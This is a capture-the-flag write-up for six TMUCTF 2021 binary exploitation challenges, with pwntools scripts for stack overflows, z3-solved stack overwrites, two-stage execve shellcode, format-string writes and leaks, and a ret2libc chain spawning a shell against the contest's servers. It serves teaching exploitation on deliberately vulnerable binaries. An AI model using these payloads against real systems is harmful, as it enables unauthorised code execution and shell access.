---
title: TMUCTF 2021 Pwn
tags: [tmuctf, ctf, writeup]
description: This is an exploit writeup for pwn challenges from tmuctf
---

# Tasks
* warmup
* babypwn
* areyouadmin
* canary
* security code
* fakesurvey

>You can download the challenges and exploits files <a href="https://github.com/kirimoe/tmuctf2021">from here</a>

# warmup
<img src="/assets/img/tmu/warmup.png">

This is an easy challenge all you have to do is to modify a varible on stack and 
set it to non-zero send some A's to binary and you will get the flag.

<img src="/assets/img/tmu/warmup_sol.png">

Flag is <span style="color:red">`TMUCTF{n0w_y0u_4r3_w4rm3d_up}`</span>

# babypwn

<img src="/assets/img/tmu/babypwn.png">

This is a classical buffer overflow challenge with no mitigation involved all you have to do is overwrite the return address with address of function <span style="color:red">`wow`</span> and you will get the flag

```python
from pwn import *

p = ELF("./babypwn")
r = remote("194.5.207.56",7010)

offset = 0x28
payload = b"A"*offset
payload += p64(p.symbols['wow'])

r.recv()
r.sendline(payload)
print(r.recvall())
```
<br>
<img src="/assets/img/tmu/babypwn_sol.png">

Flag is <span style="color:red">`TMUCTF{w0w!_y0u_c0uld_f1nd_7h3_w0w!}`</span>

# areyouadmin

<img src="/assets/img/tmu/areyouadmin.png">

This was an interesting challenge cause it was the first time I used <font color="aqua">z3</font> with a pwn challenge. Okay so the challenge was fairly easy it just ask for a username and password and thats it.

The username is <span style="color:red">`AlexTheUser`</span> and password is <span style="color:red">`4l3x7h3p455w0rd`</span> you can easily find them using the string command.

But it will only give you the flag if bypass certain conditions like this,

<img src="/assets/img/tmu/condition.png">

These are the mathematical condtions where you have to guess the variables this is where <font color="aqua">z3</font> comes into the play. <font color="aqua">z3</font> or any sat solver takes certain condition and gives you the actual numbers like,
```
a + b = 5
a - b = 1

Then z3 will solve this for you and will give you the exact value for a and b
```

The variables are the location on stack set to 0 so all you have to do is overwrite these with correct value and you will get the flag. For this you can use either username or password field both are vulnerable to buffer overflow

```python
from pwn import *
from z3 import *

a,b,c,d,e = Int('a'),Int('b'),Int('c'),Int('d'),Int('e')

def val():
    s = Solver()
    s.add((a * b) + c == 0x253f)
    s.add((b * c) + d == 0x37a2)
    s.add((c * d) + e == 0x16d3)
    s.add((d * e) + a == 0x1bc9)
    s.add((e * a) + b == 0x703f)
    s.check()
    return s.model()


l = val()

flag = False
offset = 0x60 - 0x14
username = b"AlexTheUser\x00"
password = b"4l3x7h3p455w0rd"

payload = b""
payload += username
payload += b"A" * (offset - len(username))
payload += p32(l[e].as_long())
payload += p32(l[d].as_long())
payload += p32(l[c].as_long())
payload += p32(l[b].as_long())
payload += p32(l[a].as_long())

payload2 = b""
payload2 += password
 
if flag:
    p = process("./areyouadmin")
else:
    p = remote("194.5.207.113",7020)

p.recv()
p.sendline(payload)
p.recv()
p.sendline(payload2)
print(p.recvall())
```
<br>
<img src="/assets/img/tmu/areyouadmin_sol.png">

Flag is <span style="color:red">`TMUCTF{7h3_6375_func710n_15_d4n63r0u5_4nd_5h0uld_n07_b3_u53d}`</span>

# canary
<img src="/assets/img/tmu/canary.png">

This challenge was interesting it accepts two string and tells us if they are equal or not additionally it asks for phone number at end using this field we can overwrite return address. By using checksec we can see it has an executable stack.

The challenge also provides us with address of canary

**Leaked Canary Address + 12 = Address of String1**

The challenge doesn't have an actual stack canary but a dummy value placed between our string1 and string2.

The reason it says you cannot inject shellcode because both strings only accepts input upto 15 character.

In short its a <span style="color:red">shellcoding challenge</span> with a small buffer.

Exploit is simple we have to use a stage 1 shellcode which will read our stage 2 (main) shellcode.

```python
from pwn import *
context.arch = 'amd64'

flag = False

if flag:
    p = process("./canary")
else:
    p = remote("194.5.207.113",7030)

def stage1():
    stage1_shellcode = asm('''
                    xor eax,eax
                    xor edi,edi
                    mov rsi,rsp
                    mov dl,100
                    syscall
                    jmp rsp
                ''')

    p.recv()
    p.sendline(stage1_shellcode)
    p.recv()
    p.sendline(b"Mikey-kun")
    p.recvuntil(b"address: ")
    ret = int(p.recv(14),16)+12
    log.info("Return Address : " + hex(ret))
    p.recv()
    p.sendline(b"BAJI"*5 + p64(ret))

def stage2():
    stage2_shellcode = asm('''
                            mov rbx,0x0068732f6e69622f
                            push rbx
                            mov rdi,rsp
                            xor esi,esi
                            xor edx,edx
                            xor eax,eax
                            mov al,59
                            syscall
                        ''')

    p.send(stage2_shellcode)
    p.interactive()

stage1()
stage2()
```
<br>
<img src="/assets/img/tmu/canary_sol.png">

Flag is <span style="color:red">`TMUCTF{3x3cu74bl3_574ck_15_v3ry_d4n63r0u5}`</span>

# security code

<img src="/assets/img/tmu/security_code.png">

Can you print the flag??????????? 🤣 the reason why it say this cause even if you exploit the vulnerability you will find it 🤔 why it isn't printing my flag. Lets take a look

when you execute the binary it asks for whether we want to be an admin or a user if we say admin it asks for our name and says `hello our dear admin, name_we_entered`

As soon as our name gets reflected I go for format specifiers like %p %x and indeed it was a <span style="color:red">`format string vulnerability`</span> cause it started printing values on stack.

Please note this is an 32 bit executable so not that hard

<img src="/assets/img/tmu/seccode.png">

As you can see we have to modify that <span style="color:red">`security_code`</span> variable to <span style="color:red">`0xabadcafe`</span> which was set to 0 by default.

So how do we do that, well the <span style="color:red">`%n modifier`</span> will write the data to a pointer provided before it.

Just refer this pdf and you will get it <a href="https://web.ecs.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf">Format String (Click Here)</a>

```python
seccode = 0x0804c03c

def pad(s):
    return s+b"x"*(1023-len(s))

payload = b""
payload += p32(seccode)
payload += p32(seccode+1)
payload += p32(seccode+2)
payload += p32(seccode+3)
payload += b"%238x%15$hhn"
payload += b"%204x%16$hhn"
payload += b"%227x%17$hhn"
payload += b"%254x%18$hhn"

exp = pad(payload)
```
This will set the <span style="color:red">`security_code`</span> to <span style="color:red">`0xabadcafe`</span> and will call the function <span style="color:red">`auth_admin`</span>

Now the <span style="color:red">`auth_admin`</span> will open the flag and ask for a password and simply prints out the password nothin else BUTTTTTTT!! if the password is also reflecting that means YEP you guessed it its format string vulnerable too
we know our flag will also gonna be on stack we can leak it out.

BUTTT heres a twist the password field accepts only 5 characters then how we can leak flag if we can only leak first two values right <span style="color:red">`%p %p`</span> thats where <span style="color:red">`$`</span> comes in handy.

The <span style="color:red">`$`</span> allows us access any value on stack for example if we wants to access the 4th value on stack we can do something like this <span style="color:red">`%4$x`</span>

Our flag starts at the 7th offset so thats it we have to execute our exploit multiple times and increment the offset value and we will get the entire flag <font color="red">easy_peasy</font>

```python
def leak_flag(n):
    flag = b""
    
    while b"}" not in flag:
        if isremote:
            p = remote("185.235.41.205",7040)
        else:
            p = process("./securitycode")
        
        p.recv()
        p.sendline("A")
        p.recv()
        p.send(exp)
        modifier = "%"+str(n)+"$p"
        p.sendline(modifier)
        p.recvuntil(b"password is ")
        flag += p64(int(p.recv(10),16))
        n+=1

    return flag.replace(b'\x00',b'')

flag = leak_flag(7)
print(flag)
```

<br><img src="/assets/img/tmu/security_code_sol.png">

Flag is <span style="color:red">`TMUCTF{50_y0u_kn0w_50m37h1n6_4b0u7_f0rm47_57r1n6_0xf7e11340}`</span>


# fakesurvey

<img src="/assets/img/tmu/fakesurvey.png">

This challenge showcases two vulnerabilities one is format string and other is buffer overflow. By analyzing the binary we find out that its an 32 bit executable.

When we execute the binary it first ask for the password. The password is stored in a file name <span style="color:red">`passPhrase`</span> so it opens the file and check if the password we entered is equal to the password in the passPhrase file. The password field accept input of 15 characters and is vulnerable to format string.

Remember what I said previously that it opens the file for password comparison so just like the previous challenge we can leak out the password using format string. The password starts at the 8th value on stack

```python
def leak_passphrase():
    p = remote("185.235.41.205",7050)
    p.recv()
    p.sendline(b"%8$llx %9$llx")
    p.recvuntil(b"Your password is ")
    l = p.recv()[:-1].split(b" ")
    p.close()
    password = b""
    for i in l:
        password += p64(int(i,16))
    return password
```

when you enter the correct password it then ask for your name and exits thats it. But the name field has a buffer overflow so where we have to return I mean theres isn't a specific function which will print out the flag.

So I guess we have to do <span style="color:red">`ret2libc`</span> attack. so we basically has to call <span style="color:red">`system("/bin/sh")`</span> and how we gonna do that cause we don't know the address of system also the system has <span style="color:red">`ASLR`</span> enabled.

Heres the exploit we first gonna use <span style="color:red">`ret2puts`</span> this sounds funny but we are gonna use the <span style="color:red">`puts`</span> to leak out the address of <span style="color:red">`puts`</span> and once we have address of puts we can then calculate other offsets such as system and binsh.

Theres this thing called <span style="color:red">`libc database`</span> which can help you to find the libc version if you provide it with at least single address of any function in our case its gonna be puts.

```diff
- Why we need a libc database?

Cause we dont know which version of libc remote server is using
```

then as the return address for the ret2puts we use the address of <span style="color:red">`main()`</span>

```python
def leak_libc_base():
    payload = b"A"*76
    payload += p32(binary.plt['puts'])
    payload += p32(binary.symbols['main'])
    payload += p32(binary.got['puts'])

    p.recv()
    p.recv()
    p.sendline(passphrase)
    p.recv()
    p.recv()
    p.sendline(payload)
    p.recvuntil(b"***\n")
    leak = u32(p.recv(4))
    log.info("puts libc leaked address : " + hex(leak))
    libc_base = leak - libc.symbols['puts']
    log.info("libc base address : " + hex(libc_base))
    return libc_base
```

Now we can calculate address to <span style="color:red">`system`</span> and <span style="color:red">`binsh`</span> and this time we are going to call <span style="color:red">`system("/bin/sh")`</span>

```
Exploit = [padding][puts.plt][main][puts.got]
Exploit2 = [padding][system][put_anythin_here_as_ret_address][binsh]
```

```python
def get_shell(libc_base):
    system = libc_base + libc.symbols['system']
    binsh = libc_base + next(libc.search(b"/bin/sh"))

    payload = b"A"*76
    payload += p32(system)
    payload += b"CCCC"
    payload += p32(binsh)
    p.recv()
    p.sendline(passphrase)
    p.recv()
    p.recv()
    p.send(payload)
    p.interactive()
```

<img src="/assets/img/tmu/fakesurvey_sol.png">

flag is <span style="color:red">`TMUCTF{m4yb3_y0u_u53d_7h3_574ck_4nd_r37urn3d_70_dl_r350lv3`</span>

>You can download the challenges and exploits files <a href="https://github.com/kirimoe/tmuctf2021">from here</a>
